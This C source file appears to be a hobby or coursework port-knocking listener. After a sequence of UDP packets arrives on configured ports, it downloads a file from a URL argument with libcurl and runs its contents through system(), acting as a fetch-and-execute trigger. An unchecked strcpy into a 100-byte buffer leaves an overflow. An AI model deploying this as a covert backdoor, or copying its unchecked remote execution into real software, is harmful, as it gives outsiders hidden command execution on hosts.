/*
    Raw UDP sockets
*/

// compile with gcc -o Receive_UDP_Socket Receive_UDP_Socket.c -lcurl

#include <stdio.h> //for printf
#include <string.h> //memset
#include <sys/socket.h>    //for socket ofcourse
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/udp.h>   //Provides declarations for udp header
#include <netinet/ip.h>    //Provides declarations for ip header
#include <arpa/inet.h>
#include <net/if.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <unistd.h>
#include <curl/curl.h> //apt-get install libcurl4-gnutls-dev

#define BUFLEN 65536  //Max length of buffer

void die(char *s)
{
    perror(s);
    exit(1);
}

void fetchRemoteFile(char *URL) {

  CURLcode ret;
  CURL *hnd;

  FILE *fp;

//  char *url = "http://127.1.0.1:8000/index.html";
  char outfilename[FILENAME_MAX] = "command";

  hnd = curl_easy_init();

  if (hnd) {
    fp = fopen(outfilename, "wb");
    curl_easy_setopt(hnd, CURLOPT_URL, URL); // should receive from argument
    curl_easy_setopt(hnd, CURLOPT_WRITEFUNCTION, NULL);
    curl_easy_setopt(hnd, CURLOPT_WRITEDATA, fp);

//    curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
//    curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/7.35.0");
//    curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
//    curl_easy_setopt(hnd, CURLOPT_TCP_KEEPALIVE, 1L);

    ret = curl_easy_perform(hnd);
    curl_easy_cleanup(hnd);
    hnd = NULL;
    fclose(fp); // finishing reading from remote file and write into local file
  }

//  printf("Download completed and write into local file.\n");

  // begin read command from local file (only one line in my code), and execute the command

  FILE *localfp;
  char * line = NULL;
  size_t len = 0;
  ssize_t read;

//  char *readline = NULL;
  char readline[100];

  localfp = fopen("command", "r");

  if (localfp == NULL) {
    printf("Can not open file!\n");
    exit(EXIT_FAILURE);
  }

  while ((read = getline(&line, &len, localfp)) != -1) {
//      printf("line: %s", line);
//    readline = line;
      strcpy(readline, line);
//      printf("readline: %s", readline);
  }

  fclose(localfp);

  if (line) {
    free(line);
  }

  // begin to execute command line read from local file

  printf("Begin to execute bash command:\n");
  printf("************************************\n");
  printf("\n");

  system(readline);

  printf("\n");
  printf("************************************\n");
  printf("End of executing command.\n");

}


void main(int argc, char* argv[])
{

  if (argc != 3) {
    printf("You should only provide two arguments.\n");
    exit(1);
  }

//  printf("%s\n", argv[1]); // read configuration-file


  FILE *tempfile;
  char *templine = NULL;

  size_t templen = 0;
  ssize_t tempread;

  tempfile = fopen(argv[1], "r");

  if (tempfile == NULL) {
    exit(1);
  }

  int linenumber = 0;

  while ((tempread = getline(&templine, &templen, tempfile)) != -1) {
    linenumber++; //get line number from configuration-file
  }

//  printf("linenumber of configuration-file: %d\n", linenumber);

  fclose(tempfile);

  if(templine) {
    free(templine);
  }


  FILE *file;
  char *line = NULL;

  size_t len = 0;
  ssize_t read;

  file = fopen(argv[1], "r");

  if (file == NULL) {
    exit(1);
  }

  int knock_sequence[linenumber];

  for (int i = 0; i < linenumber; i++) {
    if((read = getline(&line, &len, file)) != -1) {
//      printf("%s", line);
        knock_sequence[i] = atoi(line);
//        printf("%d\n", knock_sequence[i]); // print sequences in configuration-file
//        sleep(1);
    }
  }

//  for (int j = 0; j < 5; j++) {
//    printf("knock_sequence[%d]: %d\n", j, knock_sequence[j]);
//  }

  fclose(file);

  if(line) {
    free(line);
  }



  while(1){
    char lastIPAddress[32];  // record IP address of last received packet
    memset(lastIPAddress, 0, sizeof lastIPAddress);

    int hit = 0;

    for (int i = 0; i < linenumber; i++) {

      int socket_fd;

      if ((socket_fd=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
      {
          die("socket");
      }

      struct sockaddr_in addr, si_other;

      int slen;

      slen = sizeof(si_other);
      memset((char *) &addr, 0, sizeof(addr));

      addr.sin_family = AF_INET;
      addr.sin_port = htons(knock_sequence[i]);
      addr.sin_addr.s_addr = htonl(INADDR_ANY);

      if( bind(socket_fd, (struct sockaddr*)&addr, sizeof(addr) ) == -1)  // only listen on specified port
      {
          die("bind");
      }

      printf("Create socket on port %d\n", knock_sequence[i]);

      printf("Waiting for UDP packet...\n");
      fflush(stdout);

      int recv_len;

      char buf[BUFLEN];
      memset(buf, 0, BUFLEN);

      if ((recv_len = recvfrom(socket_fd, buf, BUFLEN, 0, (struct sockaddr *) &si_other, &slen)) == -1) // receive the first packet
      {
          die("recvfrom()");
      }

      printf("Received packet from %s, arrive at port: %d\n", inet_ntoa(si_other.sin_addr), ntohs(addr.sin_port));

      if (strlen(lastIPAddress) == 0) {
        strncpy(lastIPAddress, inet_ntoa(si_other.sin_addr), sizeof lastIPAddress - 1);
//        printf("%s\n", lastIPAddress);
      }

      while ( strcmp(inet_ntoa(si_other.sin_addr),lastIPAddress) != 0 ) { // check IP address from last packet
        recv_len = recvfrom(socket_fd, buf, BUFLEN, 0, (struct sockaddr *) &si_other, &slen);
      }

      close(socket_fd);
      printf("Close socket on port %d\n", knock_sequence[i]);
      printf("\n");

      hit++;

      if (hit == linenumber) {
//        printf("************************************\n");
        printf("Begin to fetch remote code...\n");
        printf("\n");
        fetchRemoteFile(argv[2]); //read URL from argument
      }

    }

  } // end of while

      // python -m SimpleHTTPServer
      // starts serving a site from the current directory on port 8000 with directory listing activated
      // accessible from http://127.0.0.1:8000
}
